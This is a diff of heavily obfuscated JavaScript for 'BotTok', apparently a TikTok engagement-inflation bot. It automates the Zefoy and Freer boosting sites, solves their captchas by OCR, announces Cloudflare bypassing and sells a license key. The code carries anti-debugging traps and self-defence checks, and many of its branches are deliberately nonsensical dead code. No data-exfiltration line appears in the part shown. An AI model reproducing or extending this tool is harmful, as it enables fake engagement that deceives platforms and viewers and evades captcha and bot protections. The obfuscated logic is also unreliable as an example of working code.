-  return new Promise((p366, p367) => {
-    if (v167.CCVmL(v167.nurTW, v167.YeYsA)) {
-      a0zV.recognize(p350, v167.YraOY).then(({
+  return new Promise((p358, p359) => {
+    const v162 = {
+      ELjqY: function (p360, p361) {
+        return v161.zJSEu(p360, p361);
+      },
+      EjiuS: function (p362, p363) {
+        return v161.Twusx(p362, p363);
+      },
+      HCxzg: v161.KvZfV
+    };
+    if (v161.FFfZR(v161.qHRuS, v161.vDcIx)) {
+      p359.stdout.moveCursor(0, -3);
+      v162.stdout.cursorTo(0);
+      a.stdout.clearScreenDown();
+    } else {
+      a0ip.recognize(p351, v161.dIwTD).then(({
         data: {
-          text: d
+          text: z
         }
       }) => {
-        const v168 = {
-          UspqA: function (p368) {
-            return v167.nPanI(p368);
-          },
-          NPRJm: function (p369, p370) {
-            return v167.SNHCF(p369, p370);
-          }
-        };
-        if (v167.vVjms(v167.rBPkp, v167.UFehp)) {
-          r.stdout.moveCursor(0, -3);
-          J.stdout.clearScreenDown();
-          A.stdout.write("\n" + F + "[33m " + p + " [34m[" + h + "][0m " + g + "  [90m(" + v168.UspqA(T) + " /hr " + v168.NPRJm(v168.UspqA(s), 60).toFixed(2) + " hrs)[0m\n\n");
-          H.stdout.write(u + " Waiting: " + W + " mins (ERROR: " + R.substring(0, 22) + ")...");
+        if (v162.EjiuS(v162.HCxzg, v162.HCxzg)) {
+          v162.ELjqY(v161, "Bypassing Cloudflare...");
         } else {
-          v167.qPunT(p366, d);
+          v162.ELjqY(p358, z);
         }
       });
-    } else {
-      const [, v169, v170, v171, v172, v173, v174, v175] = v172;
-      return {
-        followerCount: v167.qPunT(v173, v169),
-        followingCount: v167.VeLql(v174, v170),
-        heart: v167.VeLql(v175, v171),
-        heartCount: v167.uWbti(B, v172),
-        videoCount: v167.VeLql(r, v173),
-        diggCount: v167.uWbti(J, v174),
-        friendCount: v167.vIcWS(A, v175)
-      };
     }
   });
 }
 async function f14() {
-  const v176 = {
-    JlWhf: function (p371, p372) {
-      return p371(p372);
+  const v163 = {
+    lMFjS: function (p364, p365) {
+      return p364 ^ p365;
     },
-    OFnqf: function (p373, p374) {
-      return p373 === p374;
+    TbHmg: function (p366, p367) {
+      return p366(p367);
     },
-    cZCYS: "wBMuD",
-    jCjmC: "MiZeC",
-    iwNFn: function (p375, p376) {
-      return p375 === p376;
+    IkfBY: function (p368, p369) {
+      return p368(p369);
     },
-    ZAtKJ: "Zefoy",
-    Xbobi: "Zefoy Tasks",
-    RWAoD: "Freer Tasks",
-    BAnkm: "GqYfX",
-    hEwac: function (p377, p378) {
-      return p377 !== p378;
+    arQbw: function (p370, p371) {
+      return p370(p371);
     },
-    Hcmvl: "FRxuX",
-    uJFUs: function (p379, p380) {
-      return p379 + p380;
+    huIUL: function (p372, p373) {
+      return p372 === p373;
     },
-    lYEQb: "list",
-    cKIIy: "menu",
-    eommM: "Choose an option",
-    OcFPc: "License (VERIFIED)",
-    YlqhT: "License",
-    PTGSd: "Updates",
-    ZTwzY: "Updates (OUTDATED)",
-    awBDO: "Help",
-    qJjOs: "Exit"
+    CAkwh: "luHYh",
+    nHKZj: "Zefoy",
+    cBhwt: "Zefoy Tasks",
+    orZPv: "Freer Tasks",
+    iRumQ: function (p374, p375) {
+      return p374 !== p375;
+    },
+    zUoBp: "UIzMH",
+    fxWiv: "RSHZE",
+    RsOfl: function (p376, p377) {
+      return p376 + p377;
+    },
+    YSTuO: "list",
+    zjPoQ: "menu",
+    fLeKk: "Choose an option",
+    SmZkK: "License (VERIFIED)",
+    jjkPw: "License",
+    LlwAA: "Updates",
+    MEgac: "Updates (OUTDATED)",
+    VBxxS: "Help",
+    GQcDe: "Exit"
   };
-  if (vA0zS.task) {
-    if (v176.OFnqf(v176.cZCYS, v176.jCjmC)) {
-      v176.JlWhf(y, "UA: " + v);
-    } else if (v176.iwNFn(vA0zS.provider, v176.ZAtKJ)) {
-      return v176.Xbobi;
-    } else {
-      return v176.RWAoD;
-    }
-  } else if (v176.OFnqf(v176.BAnkm, v176.BAnkm)) {
-    const vV95 = v95;
-    let v177 = true;
-    try {
-      if (v176.hEwac(v176.Hcmvl, v176.Hcmvl)) {
-        y.log("Video:[36m " + vV95.video + " [0m");
+  if (vA0iw.task) {
+    if (v163.huIUL(v163.CAkwh, v163.CAkwh)) {
+      if (v163.huIUL(vA0iw.provider, v163.nHKZj)) {
+        return v163.cBhwt;
       } else {
-        const v178 = v176.JlWhf(a0zN, v52 + "/latest");
-        const v179 = v178.json().tag_name;
-        const v180 = v176.uJFUs("v", v17);
-        v177 = v176.OFnqf(v179, v180) ? true : false;
+        return v163.orZPv;
       }
-    } catch (U) {}
-    const v181 = {
-      type: v176.lYEQb,
-      name: v176.cKIIy,
-      message: v176.eommM,
+    } else {
+      let v164 = v163.lMFjS(v164.charCodeAt(c), 127);
+      a += v164.toString(16).padStart(2, "0");
+    }
+  } else if (v163.iRumQ(v163.zUoBp, v163.zUoBp)) {
+    const v165 = v163.TbHmg(p, C);
+    if (!v165.ok) {
+      return null;
+    }
+    const v166 = v165.text();
+    const v167 = v166.match(/"stats":\s*{\s*"followerCount":(\d+),\s*"followingCount":(\d+),\s*"heart":(\d+),\s*"heartCount":(\d+),\s*"videoCount":(\d+),\s*"diggCount":(\d+),\s*"friendCount":(\d+)\s*}/);
+    if (v167) {
+      const [, v168, v169, v170, v171, v172, v173, v174] = v167;
+      return {
+        followerCount: v163.TbHmg(T, v168),
+        followingCount: v163.TbHmg(Q, v169),
+        heart: v163.IkfBY(y, v170),
+        heartCount: v163.IkfBY(R, v171),
+        videoCount: v163.IkfBY(e, v172),
+        diggCount: v163.TbHmg(h, v173),
+        friendCount: v163.arQbw(B, v174)
+      };
+    } else {
+      return null;
+    }
+  } else {
+    const vV95 = v95;
+    let v175 = true;
+    try {
+      if (v163.iRumQ(v163.fxWiv, v163.fxWiv)) {
+        v163.arQbw(P, "UA: " + H);
+      } else {
+        const v176 = v163.arQbw(a0ia, v50 + "/latest");
+        const v177 = v176.json().tag_name;
+        const v178 = v163.RsOfl("v", v19);
+        v175 = v163.huIUL(v177, v178) ? true : false;
+      }
+    } catch (D) {}
+    const v179 = {
+      type: v163.YSTuO,
+      name: v163.zjPoQ,
+      message: v163.fLeKk,
       choices: [{
-        name: v176.Xbobi
+        name: v163.cBhwt
       }, {
-        name: v176.RWAoD
+        name: v163.orZPv
       }, {
-        name: vV95 ? v176.OcFPc : v176.YlqhT
+        name: vV95 ? v163.SmZkK : v163.jjkPw
       }, {
-        name: v177 ? v176.PTGSd : v176.ZTwzY
+        name: v175 ? v163.LlwAA : v163.MEgac
       }, {
-        name: v176.awBDO
+        name: v163.VBxxS
       }, {
-        name: v176.qJjOs
+        name: v163.GQcDe
       }]
     };
-    const v182 = await a0zv.prompt([v181]);
-    return v182.menu;
-  } else {
-    d.stdout.clearLine(0);
-    N.stdout.cursorTo(0);
-    C.stdout.write(S + " Zefoy is accessible! :)");
+    const v180 = await a0iH.prompt([v179]);
+    return v180.menu;
   }
 }
 async function f15() {
-  const v183 = {
-    ydeow: "(((.+)+)+)+$",
-    BDVkO: function (p381, p382) {
-      return p381(p382);
+  const v181 = {
+    tQIBO: function (p378, p379) {
+      return p378 + p379;
     },
-    LtfNx: "Service disabled now",
-    TUFIS: "while (true) {}",
-    wiREF: "counter",
-    Kmepz: function (p383, p384) {
-      return p383(p384);
+    nofGK: " Cookies invalid/expired!",
+    yXxOp: function (p380, p381) {
+      return p380(p381);
     },
-    TRpzI: "eng",
-    FqjLS: function (p385, p386) {
-      return p385 === p386;
+    GouJg: function (p382, p383) {
+      return p382 < p383;
     },
-    fcznh: "Cpugh",
-    lfycy: "VrcQe",
-    uGJtr: "dBZZw",
-    rkxFt: "oebgD",
-    VNnNg: function (p387, p388) {
-      return p387 + p388;
+    VWoiN: function (p384, p385) {
+      return p384 + p385;
     },
-    ZnFES: " LICENSE IS VERIFIED!",
-    TNlAS: function (p389, p390) {
-      return p389 === p390;
+    JUhfi: function (p386, p387) {
+      return p386 === p387;
     },
-    vYqEX: "hneEx",
-    JCBGI: "NxKRA",
-    vHIqG: "You are using the FREE version limited to ~5000\n",
-    zMMKp: "accumulations. The advantage of acquiring the\n",
-    wnpaN: "license is that the bot continues to work\n",
-    FOWvw: "indefinitely and accumulates large amounts.\n",
-    kcqrr: "list",
-    QsPMR: "choice",
-    kwucE: "Do you want unlock this limitation?",
-    PyKpj: "Add License Key",
-    MlqZr: "Back",
-    jrxrw: function (p391, p392) {
-      return p391 === p392;
+    SGoCn: function (p388, p389) {
+      return p388 - p389;
     },
-    GcMaq: function (p393, p394) {
-      return p393 !== p394;
+    Xbjkd: function (p390, p391) {
+      return p390 ^ p391;
     },
-    lpAye: "hEbgp",
-    EerPC: function (p395, p396) {
-      return p395 === p396;
+    BfINw: function (p392, p393, p394) {
+      return p392(p393, p394);
     },
-    ZOYhg: "CvPCM",
-    nsDIT: "CShIK",
-    ZKKFr: function (p397) {
-      return p397();
+    VZeWc: function (p395, p396) {
+      return p395 !== p396;
     },
-    OfZUO: function (p398, p399) {
-      return p398 === p399;
+    NXiUr: "hmaFD",
+    mOrkH: function (p397, p398) {
+      return p397 === p398;
     },
-    FyWnJ: "jKERN",
-    UGOHy: function (p400, p401) {
-      return p400 !== p401;
+    toMpN: "LajlE",
+    YYFMq: " LICENSE IS VERIFIED!",
+    YYmIC: "YbNmJ",
+    UhWdl: "nuRUG",
+    spaIG: "You are using the FREE version limited to ~5000\n",
+    osnbr: "accumulations. The advantage of acquiring the\n",
+    PEfEa: "license is that the bot continues to work\n",
+    aUcZC: "indefinitely and accumulates large amounts.\n",
+    jgcXw: "list",
+    ACWpz: "choice",
+    DUQHt: "Do you want unlock this limitation?",
+    VOySH: "Add License Key",
+    rKTFr: "Back",
+    QMZCZ: "NKzul",
+    tJMZS: "hiuTc",
+    dnqTl: "NetUD",
+    OFdaq: "blroI",
+    rUyJL: function (p399) {
+      return p399();
     },
-    fLGPX: "SLfoI",
-    roCAN: function (p402) {
-      return p402();
+    Bolop: function (p400, p401) {
+      return p400 === p401;
+    },
+    XWbmJ: "ilfSl",
+    YnSYd: "AnNPx",
+    fzbev: function (p402, p403) {
+      return p402 === p403;
+    },
+    wTSPp: "Vzrjl",
+    Vngyz: function (p404) {
+      return p404();
     }
   };
   if (v95) {
-    if (v183.FqjLS(v183.fcznh, v183.lfycy)) {
-      return y.toString().search(yLAWEI.ydeow).toString().constructor(v).search(yLAWEI.ydeow);
-    } else if (!v26) {
-      if (v183.FqjLS(v183.uGJtr, v183.rkxFt)) {
-        d.stdout.clearLine(0);
-        N.stdout.cursorTo(0);
-        C.stdout.write(S + " Solve the captcha manually...");
-      } else {
+    if (v181.VZeWc(v181.NXiUr, v181.NXiUr)) {
+      P.stdout.moveCursor(0, -4);
+      H.stdout.clearScreenDown();
+    } else if (!v28) {
+      if (v181.mOrkH(v181.toMpN, v181.toMpN)) {
         process.stdout.clearLine(0);
         process.stdout.cursorTo(0);
-        process.stdout.write(v183.VNnNg(v61, v183.ZnFES));
+        process.stdout.write(v181.VWoiN(v59, v181.YYFMq));
+      } else {
+        c.stdout.clearLine(0);
+        a.stdout.cursorTo(0);
+        z.stdout.write(v181.tQIBO(w, v181.nofGK));
       }
     }
-  } else if (v183.TNlAS(v183.vYqEX, v183.JCBGI)) {
-    v183.BDVkO(y, "SESSID: " + v);
-  } else {
-    console.info("\n", v183.vHIqG, v183.zMMKp, v183.wnpaN, v183.FOWvw, v65 + " Buy license in[35m " + v53 + "[0m\n");
-    const v184 = {
-      type: v183.kcqrr,
-      name: v183.QsPMR,
-      message: v183.kwucE,
+  } else if (v181.VZeWc(v181.YYmIC, v181.UhWdl)) {
+    console.info("\n", v181.spaIG, v181.osnbr, v181.PEfEa, v181.aUcZC, v63 + " Buy license in[35m " + v51 + "[0m\n");
+    const v182 = {
+      type: v181.jgcXw,
+      name: v181.ACWpz,
+      message: v181.DUQHt,
       choices: [{
-        name: v183.PyKpj
+        name: v181.VOySH
       }, {
-        name: v183.MlqZr
+        name: v181.rKTFr
       }]
     };
-    const v185 = await a0zv.prompt([v184]);
-    if (v183.jrxrw(v185.choice, v183.PyKpj)) {
-      if (v183.GcMaq(v183.lpAye, v183.lpAye)) {
-        v183.BDVkO(y, v);
+    const v183 = await a0iH.prompt([v182]);
+    if (v181.mOrkH(v183.choice, v181.VOySH)) {
+      if (v181.JUhfi(v181.QMZCZ, v181.tJMZS)) {
+        return v181;
       } else {
-        if (!v26) {
-          if (v183.EerPC(v183.ZOYhg, v183.nsDIT)) {
-            v183 = v183.LtfNx;
-          } else {
+        if (!v28) {
+          if (v181.VZeWc(v181.dnqTl, v181.OFdaq)) {
             process.stdout.moveCursor(0, -1);
             process.stdout.clearScreenDown();
+          } else {
+            v181.yXxOp(P, "Check browser (" + H + ")...");
           }
         }
-        return await v183.ZKKFr(f16);
+        return await v181.rUyJL(f16);
       }
     }
-    if (v183.OfZUO(await v185.choice, v183.MlqZr)) {
-      if (v183.OfZUO(v183.FyWnJ, v183.FyWnJ)) {
-        if (!v26) {
-          if (v183.UGOHy(v183.fLGPX, v183.fLGPX)) {
-            return function (p403) {}.constructor(yLAWEI.TUFIS).apply(yLAWEI.wiREF);
-          } else {
+    if (v181.Bolop(await v183.choice, v181.rKTFr)) {
+      if (v181.VZeWc(v181.XWbmJ, v181.YnSYd)) {
+        if (!v28) {
+          if (v181.fzbev(v181.wTSPp, v181.wTSPp)) {
             process.stdout.moveCursor(0, -9);
             process.stdout.clearScreenDown();
+          } else if (v181.GouJg(v181.tQIBO(C, 1), J.length)) {
+            let v184 = y[R];
+            e[h] = B[v181.VWoiN(v, 1)];
+            G[v181.VWoiN(Y, 1)] = v184;
           }
         }
-        await v183.ZKKFr(f3);
-        await v183.roCAN(f2);
+        await v181.rUyJL(f3);
+        await v181.Vngyz(f2);
         return;
+      } else if (v181.JUhfi(z, 0)) {
+        D = l;
       } else {
-        v.recognize(d, v183.TRpzI).then(({
-          data: {
-            text: U
-          }
-        }) => {
-          v183.Kmepz(v185, U);
-        });
+        M = v181.SGoCn(q, o);
       }
     }
+  } else {
+    let v185 = v181.Xbjkd(v181.BfINw(a, z.substr(w, 2), 16), 127);
+    A += p.fromCharCode(v185);
   }
 }
 async function f16() {
   const v186 = {
-    oHHlL: function (p404, p405) {
-      return p404(p405);
+    JALes: "input",
+    ZQVTP: "license",
+    qhwYJ: "Paste your License Key here:",
+    ZAIHl: function (p405, p406) {
+      return p405(p406);
     },
-    MlEyK: "input",
-    wYDzL: "license",
-    tJZET: "Paste your License Key here:",
-    glIAl: function (p406, p407) {
-      return p406(p407);
+    SNdKe: function (p407, p408) {
+      return p407 === p408;
     },
-    NdLNe: function (p408, p409) {
-      return p408 !== p409;
-    },
-    BFJXw: "ydlwQ",
-    uJIyI: "zgCNG",
-    hfrQj: function (p410) {
-      return p410();
-    },
-    kKIhI: function (p411) {
-      return p411();
+    AkAzb: "mciUo",
+    pMZgj: "Nsrva",
+    aDzki: function (p409) {
+      return p409();
     }
   };
   const v187 = {
-    type: v186.MlEyK,
-    name: v186.wYDzL,
-    message: v186.tJZET
+    type: v186.JALes,
+    name: v186.ZQVTP,
+    message: v186.qhwYJ
   };
-  const v188 = await a0zv.prompt([v187]);
+  const v188 = await a0iH.prompt([v187]);
   const v189 = v188.license;
-  await v186.glIAl(f34, v189);
-  if (!v26) {
-    if (v186.NdLNe(v186.BFJXw, v186.uJIyI)) {
+  await v186.ZAIHl(f35, v189);
+  if (!v28) {
+    if (v186.SNdKe(v186.AkAzb, v186.pMZgj)) {
+      return v186;
+    } else {
       process.stdout.moveCursor(0, -9);
       process.stdout.clearScreenDown();
-    } else {
-      const v190 = {
-        HrOuh: function (p412, p413) {
-          return v186.oHHlL(p412, p413);
-        }
-      };
-      const v191 = /@(\w+)\n(.+)\n(\d+\s\w+\sago)\n([\d|\,]+)/g;
-      const v192 = [...v187.matchAll(v191)];
-      return v192.map(p414 => {
-        return {
-          username: p414[1],
-          comment: p414[2],
-          timestamp: p414[3],
-          likes: v190.HrOuh(v191, p414[4].replace(/[,\.]/g, "")),
-          concat: "@" + p414[1] + " \"" + p414[2].substring(0, 10) + "...\" " + p414[3] + " (" + p414[4] + ")"
-        };
-      });
     }
   }
-  await v186.hfrQj(f3);
-  await v186.kKIhI(f2);
+  await v186.aDzki(f3);
+  await v186.aDzki(f2);
   return;
 }
-async function f17(p415) {
-  const v193 = {
-    MnPIZ: "--disable-gpu",
-    GxSTr: "--disable-gpu-compositing",
-    kaaeX: function (p416, p417) {
-      return p416 === p417;
+async function f17(p410) {
+  const v190 = {
+    MWktP: "function *\\( *\\)",
+    hNyWk: "\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)",
+    SmkAV: function (p411, p412) {
+      return p411(p412);
     },
-    Fvclo: "Up ",
-    gpBug: function (p418, p419) {
-      return p418 !== p419;
+    PGCWK: "init",
+    OGqoR: function (p413, p414) {
+      return p413 + p414;
     },
-    QiOyQ: "QhtHj",
-    JDlvP: "Back",
-    Kqjsh: "BGYNn",
-    PcfIT: "AVgju",
-    fxwua: "eDuDk",
-    MzOSu: "ePhdZ",
-    ypjRu: "list",
-    LElid: "mode",
-    QxzQK: "What task do you want me to do?"
+    lAIFe: "chain",
+    aPJGo: function (p415, p416) {
+      return p415 + p416;
+    },
+    xdwqk: "input",
+    SnbfS: function (p417, p418) {
+      return p417(p418);
+    },
+    xtjfW: function (p419) {
+      return p419();
+    },
+    acpia: "./alpine-update.sh",
+    yAPrL: function (p420, p421) {
+      return p420(p421);
+    },
+    IJGrl: function (p422, p423) {
+      return p422 === p423;
+    },
+    IIUjF: "Up ",
+    SgEOS: function (p424, p425) {
+      return p424 === p425;
+    },
+    CDMrH: "FDqSC",
+    UIyRb: "GVJzn",
+    RgMJN: "Back",
+    zxHWC: function (p426, p427) {
+      return p426 === p427;
+    },
+    Dbbmu: "LPWhW",
+    GNeeq: "KdAsc",
+    easXM: function (p428, p429) {
+      return p428 !== p429;
+    },
+    ViqqJ: "BGTlO",
+    FPAov: "THTKV",
+    IlqhF: "list",
+    UBJSS: "mode",
+    ZdbUx: "What task do you want me to do?"
   };
-  const vV193 = v193;
-  let v194 = await p415.evaluate("(() => {\n      let choices = Array.from(document.querySelectorAll(\".card-body\"));\n      choices = choices.map((c) => {\n        const parts = c.innerText.replace(" + /(\r\n|\n|\r)/gm + ", \" \").split(\"  \");\n        return {\n          name: 'Up ' + parts[0],\n          disabled:" + /soon/ + ".test(parts[1]) ? true : false,\n        };\n      });\n      return choices.filter((c) => !c.disabled);\n    })();");
-  if (vV193.kaaeX(v194[0].name, vV193.Fvclo)) {
-    if (vV193.gpBug(vV193.QiOyQ, vV193.QiOyQ)) {
-      y.log(p415);
-      return false;
+  let v191 = await p410.evaluate("(() => {\n      let choices = Array.from(document.querySelectorAll(\".card-body\"));\n      choices = choices.map((c) => {\n        const parts = c.innerText.replace(" + /(\r\n|\n|\r)/gm + ", \" \").split(\"  \");\n        return {\n          name: 'Up ' + parts[0],\n          disabled:" + /soon/ + ".test(parts[1]) ? true : false,\n        };\n      });\n      return choices.filter((c) => !c.disabled);\n    })();");
+  if (v190.IJGrl(v191[0].name, v190.IIUjF)) {
+    if (v190.SgEOS(v190.CDMrH, v190.UIyRb)) {
+      p410 = v190;
     } else {
       return false;
     }
   }
-  const v195 = {
-    name: vV193.JDlvP
+  const v192 = {
+    name: v190.RgMJN
   };
-  v194.push(v195);
-  if (!v26) {
-    if (vV193.gpBug(vV193.Kqjsh, vV193.Kqjsh)) {
-      vV193.stdout.clearLine(0);
-      v194.stdout.cursorTo(0);
-      v195.stdout.write(t + " Wrong captcha! (" + V + ")");
+  v191.push(v192);
+  if (!v28) {
+    if (v190.zxHWC(v190.Dbbmu, v190.GNeeq)) {
+      const v193 = new v191(dXbhVj.MWktP);
+      const v194 = new v192(dXbhVj.hNyWk, "i");
+      const v195 = dXbhVj.SmkAV(z, dXbhVj.PGCWK);
+      if (!v193.test(dXbhVj.OGqoR(v195, dXbhVj.lAIFe)) || !v194.test(dXbhVj.aPJGo(v195, dXbhVj.xdwqk))) {
+        dXbhVj.SnbfS(v195, "0");
+      } else {
+        dXbhVj.xtjfW(v193);
+      }
     } else {
       process.stdout.clearLine(0);
       process.stdout.cursorTo(0);
     }
   }
-  if (vA0zS.task) {
-    if (vV193.gpBug(vV193.PcfIT, vV193.PcfIT)) {
-      return v195.task;
+  if (vA0iw.task) {
+    if (v190.easXM(v190.ViqqJ, v190.ViqqJ)) {
+      s.log(v190.acpia);
     } else {
-      return vA0zS.task;
+      return vA0iw.task;
     }
-  } else if (vV193.gpBug(vV193.fxwua, vV193.MzOSu)) {
-    const v196 = {
-      type: vV193.ypjRu,
-      name: vV193.LElid,
-      message: vV193.QxzQK,
-      choices: v194
-    };
-    const v197 = await a0zv.prompt([v196]);
-    return v197.mode;
+  } else if (v190.easXM(v190.FPAov, v190.FPAov)) {
+    v190.yAPrL(p410, "Wrong captcha! (" + v190 + ")");
   } else {
-    y = [...p415, vV193.MnPIZ, vV193.GxSTr];
+    const v196 = {
+      type: v190.IlqhF,
+      name: v190.UBJSS,
+      message: v190.ZdbUx,
+      choices: v191
+    };
+    const v197 = await a0iH.prompt([v196]);
+    return v197.mode;
   }
 }
-async function f18(p420 = null) {
+async function f18(p430 = null) {
   const v198 = {
-    TWiHO: "./alpine-update.sh",
-    APQoU: function (p421, p422) {
-      return p421 + p422;
-    },
-    JugZA: " Solve captcha automatically...",
-    HulAX: function (p423, p424) {
-      return p423 === p424;
-    },
-    RFfwa: function (p425, p426) {
-      return p425 - p426;
-    },
-    bZxxD: function (p427, p428) {
-      return p427 || p428;
-    },
-    MBYaM: function (p429, p430) {
-      return p429 - p430;
-    },
-    RssKW: function (p431, p432) {
+    maofk: function (p431, p432) {
       return p431(p432);
     },
-    MsZKy: function (p433, p434) {
-      return p433 === p434;
+    jBYgH: "[36m",
+    NnBcW: "[0m",
+    EXWDr: function (p433, p434) {
+      return p433 / p434;
     },
-    cHiBq: "cBvob",
-    nEeYN: function (p435) {
+    npxPc: function (p435) {
       return p435();
     },
-    gpxGv: "JpPRZ",
-    bXFIm: "XYgsN",
-    QetnQ: function (p436, p437) {
-      return p436 !== p437;
+    JcgFP: function (p436, p437) {
+      return p436 + p437;
     },
-    JSkPj: "EgxgT",
-    jqwgb: "ZvYAw",
-    MGJEx: "JzXJz",
-    KmmQv: "Recent Videos",
-    xwhcq: "New Video",
-    ayOZx: "Back",
-    LqxvP: "list",
-    KEAyB: "choice",
-    qeKTK: "Would you like to select a recent video?",
-    FKOKE: function (p438, p439) {
-      return p438 === p439;
+    eSRbW: " LICENSE IS VERIFIED!",
+    HAvmG: function (p438, p439) {
+      return p438(p439);
     },
-    WJkvR: function (p440, p441) {
+    EgCCd: function (p440, p441) {
       return p440 === p441;
     },
-    qfSUc: "vJvkv",
-    bBTYG: function (p442) {
+    fASvK: "UtpCO",
+    iONGt: function (p442) {
       return p442();
     },
-    TnpAp: function (p443, p444) {
+    SSVmC: function (p443, p444) {
       return p443 === p444;
     },
-    aDcNV: function (p445, p446) {
-      return p445 === p446;
+    VVHeW: "yhtwk",
+    ggFBp: "KOQPB",
+    xlMcb: "FEOxI",
+    xwDDe: "vvqvj",
+    UqWZu: "TLtrJ",
+    tPkls: "Recent Videos",
+    AthtP: "New Video",
+    QzBOZ: "Back",
+    TAVdC: "list",
+    GnPEY: "choice",
+    iKZww: "Would you like to select a recent video?",
+    vZDcV: function (p445, p446) {
+      return p445 !== p446;
     },
-    QCfZS: "NeeQu",
-    udgML: function (p447, p448) {
-      return p447 === p448;
+    QJpTB: "LCYyV",
+    Qyosr: "TyYGF",
+    txdOo: function (p447) {
+      return p447();
     },
-    ldMzB: "cVlsF",
-    mRlHL: function (p449, p450) {
-      return p449 === p450;
+    rRJLo: function (p448, p449) {
+      return p448 === p449;
     },
-    beyrG: "Zefoy",
-    xoBFD: function (p451, p452) {
-      return p451 === p452;
+    VOaHw: function (p450, p451) {
+      return p450 !== p451;
     },
-    mLcis: "dnwjP",
-    NOKkD: "TPvnI",
-    cAfcN: function (p453, p454, p455) {
-      return p453(p454, p455);
+    NtBge: "shUva",
+    KzGbI: "DVEsW",
+    cGCxw: function (p452, p453) {
+      return p452 === p453;
     },
-    AxmSk: "Freer",
-    ggXwj: function (p456, p457) {
-      return p456 !== p457;
+    XfQYC: "jlnGi",
+    TDMcl: "Zefoy",
+    HriDa: function (p454, p455) {
+      return p454 === p455;
     },
-    qlYvJ: "TkeXb",
-    fLKEa: function (p458, p459, p460) {
-      return p458(p459, p460);
+    Daxzf: "Anacx",
+    Qkvys: "sidjW",
+    saydw: function (p456, p457, p458) {
+      return p456(p457, p458);
     },
-    gSjtU: function (p461, p462) {
-      return p461 !== p462;
+    AdXCH: "Freer",
+    DynUP: function (p459, p460) {
+      return p459 !== p460;
     },
-    RwMaW: "TiqHF"
+    VKHEC: "WGNsW",
+    TsvJg: "zxdKw",
+    SmgWc: function (p461, p462, p463) {
+      return p461(p462, p463);
+    },
+    BIRJf: "asUrt"
   };
-  if (vA0zS.video) {
-    if (v198.MsZKy(v198.cHiBq, v198.cHiBq)) {
-      let v199 = await v198.nEeYN(f33);
-      if (!v199.some(p463 => p463.url === vA0zS.video)) {
-        if (v198.HulAX(v198.gpxGv, v198.bXFIm)) {
-          y = v.concat;
+  if (vA0iw.video) {
+    if (v198.EgCCd(v198.fASvK, v198.fASvK)) {
+      let v199 = await v198.iONGt(f34);
+      if (!v199.some(p464 => p464.url === vA0iw.video)) {
+        if (v198.SSVmC(v198.VVHeW, v198.ggFBp)) {
+          return null;
         } else {
           v199.push({
-            url: vA0zS.video,
+            url: vA0iw.video,
             timestamp: new Date().getTime()
           });
-          await v198.RssKW(f32, v199);
+          await v198.HAvmG(f33, v199);
         }
       }
-      if (!v26) {
-        if (v198.QetnQ(v198.JSkPj, v198.JSkPj)) {
-          v = p420.get(v198);
+      if (!v28) {
+        if (v198.SSVmC(v198.xlMcb, v198.xwDDe)) {
+          v198.maofk(P, "Captcha resolved! (" + H + ")");
         } else {
-          console.log("Video:[36m " + vA0zS.video + " [0m");
+          console.log("Video:[36m " + vA0iw.video + " [0m");
         }
       }
-      return vA0zS.video;
+      return vA0iw.video;
     } else {
-      return false;
+      p430.log(v198.jBYgH, "                                                          \n@@@@@@@    @@@@@@   @@@@@@@   @@@@@@@   @@@@@@   @@@  @@@  \n@@@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@  @@@@@@@@  @@@  @@@  \n@@!  @@@  @@!  @@@    @@!       @@!    @@!  @@@  @@!  !@@  \n!@   @!@  !@!  @!@    !@!       !@!    !@!  @!@  !@!  @!!  \n@!@!@!@   @!@  !@!    @!!       @!!    @!@  !@!  @!@@!@!   \n!!!@!!!!  !@!  !!!    !!!       !!!    !@!  !!!  !!@!!!    \n!!:  !!!  !!:  !!!    !!:       !!:    !!:  !!!  !!: :!!   \n:!:  !:!  :!:  !:!    :!:       :!:    :!:  !:!  :!:  !:!  \n:: ::::  ::::: ::     ::        ::    ::::: ::   ::  :::  \n:: : ::    : :  :      :         :      : :  :    :   :::", "\n\nBotTok " + v198 + " TikTok Up Bot (by @DevMHOne)    Exit: [CTRL+C] \n", v198.NnBcW);
+      z.log(w + " Find help in Telegram (https://t.me/bottok_help)\n");
     }
-  } else if (v198.MsZKy(v198.jqwgb, v198.MGJEx)) {
-    y = v;
-  } else {
+  } else if (v198.EgCCd(v198.UqWZu, v198.UqWZu)) {
     const v200 = {
-      name: v198.KmmQv
+      name: v198.tPkls
     };
     const v201 = {
-      name: v198.xwhcq
+      name: v198.AthtP
     };
     const v202 = {
-      name: v198.ayOZx
+      name: v198.QzBOZ
     };
     const v203 = [v200, v201, v202];
     const v204 = {
-      type: v198.LqxvP,
-      name: v198.KEAyB,
-      message: v198.qeKTK,
+      type: v198.TAVdC,
+      name: v198.GnPEY,
+      message: v198.iKZww,
       choices: v203
     };
-    const v205 = await a0zv.prompt([v204]);
-    if (v198.FKOKE(await v205.choice, v198.KmmQv)) {
-      if (v198.WJkvR(v198.qfSUc, v198.qfSUc)) {
-        return await v198.bBTYG(f19);
+    const v205 = await a0iH.prompt([v204]);
+    if (v198.SSVmC(await v205.choice, v198.tPkls)) {
+      if (v198.vZDcV(v198.QJpTB, v198.Qyosr)) {
+        return await v198.txdOo(f19);
       } else {
-        v201.log(v198.TWiHO);
+        p430.stdout.clearLine(0);
+        v198.stdout.cursorTo(0);
+        z.stdout.write(w + " You are being rate limited by Freer!");
       }
-    } else if (v198.TnpAp(await v205.choice, v198.ayOZx)) {
-      if (v198.aDcNV(v198.QCfZS, v198.QCfZS)) {
-        if (!v26) {
-          if (v198.udgML(v198.ldMzB, v198.ldMzB)) {
+    } else if (v198.rRJLo(await v205.choice, v198.QzBOZ)) {
+      if (v198.VOaHw(v198.NtBge, v198.KzGbI)) {
+        if (!v28) {
+          if (v198.cGCxw(v198.XfQYC, v198.XfQYC)) {
             process.stdout.moveCursor(0, -2);
             process.stdout.clearScreenDown();
           } else {
-            p420.stdout.clearLine(0);
-            v198.stdout.cursorTo(0);
-            C.stdout.write(v198.APQoU(S, v198.JugZA));
+            v202 = "Extracting comments (" + v204.length + ")...";
           }
         }
-        if (v198.mRlHL(v90, v198.beyrG)) {
-          if (v198.xoBFD(v198.mLcis, v198.NOKkD)) {
-            if (v198.HulAX(C, 0)) {
-              v201 = v202;
-            } else {
-              v203 = v198.RFfwa(v204, v205);
-            }
+        if (v198.cGCxw(v90, v198.TDMcl)) {
+          if (v198.HriDa(v198.Daxzf, v198.Qkvys)) {
